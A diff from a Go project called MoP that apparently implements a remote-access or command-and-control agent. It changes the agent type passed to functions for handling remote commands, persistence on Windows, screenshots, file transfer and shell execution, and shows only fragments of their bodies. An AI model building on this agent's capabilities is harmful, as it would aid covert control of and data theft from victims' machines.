@@ -1,8 +1,8 @@
 package commands
 
 import (
-	"MoP/src/messages"
 	"MoP/src/middlewares"
+	"MoP/src/models"
 	"MoP/src/requests"
 	"encoding/base64"
 	"fmt"
@@ -19,7 +19,7 @@ import (
 
 var timeToSleep = 10
 
-func HandleAgentCommands(ID int, command string, agent messages.NewAgent) {
+func HandleAgentCommands(ID int, command string, agent models.NewAgent) {
 	slicedCommand := middlewares.SliceCommand(command)
 	baseCommand := slicedCommand[0]
 
@@ -74,7 +74,7 @@ func HandleAgentCommands(ID int, command string, agent messages.NewAgent) {
 
 }
 
-func persistAgent(agent messages.NewAgent) (resp string) {
+func persistAgent(agent models.NewAgent) (resp string) {
 	resp = ""
 	if agent.SO == "windows" {
 		fileName := filepath.Base(os.Args[0])
@@ -111,7 +111,7 @@ func persistAgent(agent messages.NewAgent) (resp string) {
 	return b64
 }
 
-func takeScreenshot(agent messages.NewAgent) string {
+func takeScreenshot(agent models.NewAgent) string {
 	files := requests.GetFile(agent)
 	for _, file := range files {
 		if file.Direction == "screenshot" {
@@ -149,7 +149,7 @@ func takeScreenshot(agent messages.NewAgent) string {
 	return b64
 }
 
-func postFile(agent messages.NewAgent, filePath string) (resp string) {
+func postFile(agent models.NewAgent, filePath string) (resp string) {
 	files := requests.GetFile(agent)
 	for _, file := range files {
 		if file.Direction == "download" {
@@ -172,7 +172,7 @@ func postFile(agent messages.NewAgent, filePath string) (resp string) {
 	return b64
 }
 
-func getFile(agent messages.NewAgent) (resp string) {
+func getFile(agent models.NewAgent) (resp string) {
 
 	files := requests.GetFile(agent)
 	for _, file := range files {
@@ -193,7 +193,7 @@ func getFile(agent messages.NewAgent) (resp string) {
 	return b64
 }
 
-func shellCommand(command string, agent messages.NewAgent) string {
+func shellCommand(command string, agent models.NewAgent) string {
 	var resp string
 
 	if agent.SO == "windows" {
